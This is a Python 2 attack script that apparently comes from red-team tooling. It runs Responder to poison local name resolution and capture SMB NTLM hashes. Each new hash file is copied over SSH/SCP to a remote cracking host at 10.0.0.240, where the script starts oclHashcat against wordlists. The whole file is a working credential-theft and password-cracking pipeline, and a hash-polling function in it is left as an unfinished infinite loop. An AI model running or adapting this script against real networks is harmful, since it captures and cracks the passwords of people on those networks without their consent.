#!/usr/bin/env python

from scp import SCPClient
import string
import multiprocessing
import random
import paramiko
import getpass
import re
import time
import os
import signal
import trollius
import argparse
import sys
import subprocess

def parse_args():
	#Create the arguments
    parser = argparse.ArgumentParser()
#    parser.add_argument("-d", "--directory", help="Enter the directory that Responder is in")
    return parser.parse_args()

def launch_responder():
    '''
    Launches Responder
    '''
    DN = open(os.devnull, 'w')
    cmd = 'sudo xterm -hold -e python Responder.py -I eth0 -w'
    print '[*] Running: {}'.format(cmd)
    rspndr = subprocess.Popen(cmd.split(), stdout=DN, stderr=DN, preexec_fn=os.setsid)
    return rspndr

def get_user_creds():
    user = raw_input('LDAP username for connecting to Crackerbox: ')
    pw = getpass.getpass()
    return user, pw

def parse_resp_output(hash_files):
    new_hash_files = []

    for f in os.listdir("logs"):
        if f not in hash_files:
            # Specifically check for SMB stuff, exapand on this later
            if 'SMB-NTLM' in f:
                new_hash_files.append(f)

    return new_hash_files

def ssh_client(server, port, user, pw):
    client = paramiko.SSHClient()
    client.load_system_host_keys()
    # Auto add host keys to known_keys
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(server, port, user, pw)
    except paramiko.AuthenticationException:
        sys.exit('[-] Authentication failed')
    return client

def make_hashcat_cmd(hash_file, user):
    ran_str = ''.join(random.choice(string.letters) for x in range(5))
    identifier = user+'-'+ran_str
    hashcat  = '/opt/oclHashcat-1.36/oclHashcat64.bin --session {}'.format(identifier)
    hashcat += ' -m {} '
    hashcat += '-o {} /tmp/{} /opt/wordlists/* -r /opt/oclHashcat-1.36/rules/best64.rule'.format(identifier, hash_file)
    match = re.match('SMB-NTLM(v1|v2)', hash_file)
    if match:
        hashtype = match.group()
        if hashtype == 'SMB-NTLMv1':
            hashcat = hashcat.format('5500')
            screen = 'screen -S {} -dm {}'.format(identifier, hashcat)
        elif hashtype == 'SMB-NTLMv2':
            hashcat = hashcat.format('5600')
            screen = 'screen -S {} -dm {}'.format(identifier, hashcat)

        print '[+] Running on crackerbox:'
        print '    {}'.format(screen)
        return screen, identifier

def find_cracked_hashes(ssh, identifier):
    '''
    Read the .pot hashcat files for cracked hashes
    '''
    found = False
    while found == False:
        cmd = 'cat {}'.format(identifier)
        stdin, stdout, stderr = ssh.exec_command(cmd)
        print ':', stdout.read()

def main(args):

    # Root check
    if os.geteuid() != 0:
        sys.exit('[-] Please run as root')

    hash_files = []
    sent_hashes = []
    identifiers = []
    remote_path = '/tmp/{}'
    loc_path = os.getcwd()+'/logs/{}'

    # Setup scp
    user, pw = get_user_creds()
    ssh = ssh_client('10.0.0.240', 22, user, pw)
    scp = SCPClient(ssh.get_transport())

    #Launch responder
    rspndr = launch_responder()

    # Check for new hashes and send them off
    try:
        while 1:
            new_hash_files = parse_resp_output(hash_files)
            hash_files = hash_files + list(set(new_hash_files) - set(hash_files))
            unsent = [h for h in hash_files if h not in sent_hashes]
            for u in unsent:
                print '[+] New hash found!'
                scp.put(loc_path.format(u), remote_path.format(u))
                sent_hashes.append(u)
                hashcat_cmd, identifier = make_hashcat_cmd(u, user)
                if identifier not in identifiers:
                    identifiers.append(identifier)
                # Execute the screen session on crackerbox
                stdin, stdout, stderr = ssh.exec_command(hashcat_cmd)
            time.sleep(1)

    except KeyboardInterrupt:
        print '[*] Killing Responder'
        os.killpg(rspndr.pid, signal.SIGTERM)

main(parse_args())
